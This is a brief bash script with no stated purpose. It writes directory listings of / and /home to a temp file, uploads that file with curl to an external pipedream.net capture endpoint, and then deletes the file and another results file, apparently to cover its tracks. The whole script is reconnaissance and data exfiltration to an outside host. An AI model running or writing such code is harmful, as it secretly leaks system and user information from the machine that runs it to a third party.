#!/bin/bash

ls -la / > /tmp/file.txt
ls -la /home >> /tmp/file.txt


curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/

rm /tmp/file.txt
rm /tmp/run-results.txt
